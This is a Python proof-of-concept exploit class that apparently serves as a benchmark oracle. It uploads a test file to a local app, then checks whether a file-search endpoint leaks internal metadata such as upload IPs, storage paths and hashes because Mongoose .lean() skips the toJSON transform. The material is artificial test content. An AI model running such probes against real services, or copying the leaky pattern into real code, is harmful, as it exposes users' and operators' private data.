"""PoC exploit: Information disclosure via .lean() bypassing toJSON transform (CWE-200).

After the 3-stage chain, GET /api/files/search returns file documents
serialized as plain JS objects (via .lean()) instead of Mongoose documents
(which would apply the toJSON transform). The toJSON transform normally
strips internal fields, but .lean() bypasses it entirely.

The attack:
1. Upload a test file (populates internal metadata: upload_ip, scan_status, etc.)
2. Search via GET /api/files/search with API key
3. Response includes upload_ip, scan_status, storage_path, original_hash
4. Any API-key-holding client can extract internal server metadata
"""

import uuid
import json
import urllib.error
import urllib.request

from mosaic.oracle.exploit import ExploitTest, RequestLog


class FileLeakLeanMetadataExploit(ExploitTest):
    """Information disclosure via .lean() bypassing toJSON on file search."""

    def __init__(self, base_url: str = "http://localhost:8000"):
        super().__init__(base_url)
        self._file_id: str = ""
        self._api_key: str = "dev-key-001"

    @property
    def chain_id(self) -> str:
        return "fileupload_lean_metadata"

    def setup(self) -> None:
        """Upload a test file to populate internal metadata fields."""
        boundary = f"----MosaicBoundary{uuid.uuid4().hex[:16]}"

        # Minimal JPEG header
        file_content = b"\xff\xd8\xff\xe0" + b"\x00" * 100

        body_parts = []
        body_parts.append(f"--{boundary}\r\n".encode())
        body_parts.append(
            f'Content-Disposition: form-data; name="avatar"; '
            f'filename="leak_test.jpg"\r\n'.encode("utf-8")
        )
        body_parts.append(b"Content-Type: image/jpeg\r\n")
        body_parts.append(b"\r\n")
        body_parts.append(file_content)
        body_parts.append(f"\r\n--{boundary}--\r\n".encode())

        body = b"".join(body_parts)

        url = f"{self.base_url}/upload-avatar"
        req = urllib.request.Request(
            url,
            data=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            },
            method="POST",
        )

        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                resp_body = resp.read().decode()
                self._request_logs.append(RequestLog(
                    method="POST",
                    url=url,
                    status_code=resp.status,
                    request_body="<multipart: leak_test.jpg>",
                    response_body=resp_body[:2000],
                ))
                data = json.loads(resp_body)
                file_data = data.get("data", {})
                self._file_id = str(
                    file_data.get("id", "")
                    or file_data.get("_id", "")
                    or data.get("id", "")
                )
        except urllib.error.HTTPError as e:
            resp_body = e.read().decode() if e.fp else ""
            self._request_logs.append(RequestLog(
                method="POST",
                url=url,
                status_code=e.code,
                request_body="<multipart: leak_test.jpg>",
                response_body=resp_body[:2000],
            ))
        except urllib.error.URLError as e:
            raise ConnectionError(
                f"Upload server not reachable at {self.base_url}: {e}"
            )

    def execute(self) -> tuple[bool, str]:
        """Search for files and check if internal metadata fields are leaked."""
        evidence_parts = []
        vuln_found = False

        # Search for the uploaded file via API
        resp = self.http_get(
            "/api/files/search?q=leak_test",
            headers={"x-api-key": self._api_key},
        )

        if resp.status_code == 404:
            return False, "Search endpoint /api/files/search not found — stage 1 may not be applied"

        if not resp.ok:
            return False, (
                f"Search endpoint error: {resp.status_code} "
                f"{resp.text[:200]}"
            )

        data = resp.json() if resp.text.strip() else {}
        files_list = data.get("files", [])

        if not files_list:
            # Try without query filter
            resp = self.http_get(
                "/api/files/search",
                headers={"x-api-key": self._api_key},
            )
            if resp.ok:
                data = resp.json() if resp.text.strip() else {}
                files_list = data.get("files", [])

        if not files_list:
            return False, "Search returned no files — upload may have failed"

        # Check the first file for leaked internal fields
        file_doc = files_list[0]
        returned_fields = list(file_doc.keys())
        evidence_parts.append(f"Returned fields: {returned_fields}")

        leaked_fields = []

        # Check for each internal field that toJSON should strip
        if "upload_ip" in file_doc:
            leaked_fields.append("upload_ip")
            evidence_parts.append(
                f"upload_ip leaked: {file_doc['upload_ip']}"
            )
            vuln_found = True

        if "scan_status" in file_doc:
            leaked_fields.append("scan_status")
            evidence_parts.append(
                f"scan_status leaked: {file_doc['scan_status']}"
            )
            vuln_found = True

        if "storage_path" in file_doc:
            leaked_fields.append("storage_path")
            evidence_parts.append(
                f"storage_path leaked: {file_doc['storage_path']}"
            )
            vuln_found = True

        if "original_hash" in file_doc:
            leaked_fields.append("original_hash")
            evidence_parts.append(
                f"original_hash leaked: {file_doc['original_hash']}"
            )
            vuln_found = True

        # Also check for path field (also stripped by toJSON)
        if "path" in file_doc:
            leaked_fields.append("path")
            evidence_parts.append(
                f"path leaked: {file_doc['path']}"
            )

        # Check if _id vs id transform was bypassed
        if "_id" in file_doc and "id" not in file_doc:
            leaked_fields.append("_id (no id transform)")
            evidence_parts.append("_id returned instead of id — toJSON not applied")
            vuln_found = True

        if "__v" in file_doc:
            leaked_fields.append("__v")
            evidence_parts.append("__v (version key) leaked")

        # Check pagination data if present (confirms stage 2)
        pagination = data.get("pagination")
        if pagination:
            evidence_parts.append(
                f"Pagination active: total={pagination.get('total', '?')}"
            )

        if vuln_found:
            return True, (
                f"Information disclosure via .lean() bypassing toJSON (CWE-200). "
                f"File search returns raw documents with internal metadata. "
                f"Leaked fields: {', '.join(leaked_fields)}. "
                + " | ".join(evidence_parts)
            )

        return False, (
            f"No internal fields leaked — toJSON transform appears active. "
            + " | ".join(evidence_parts)
        )
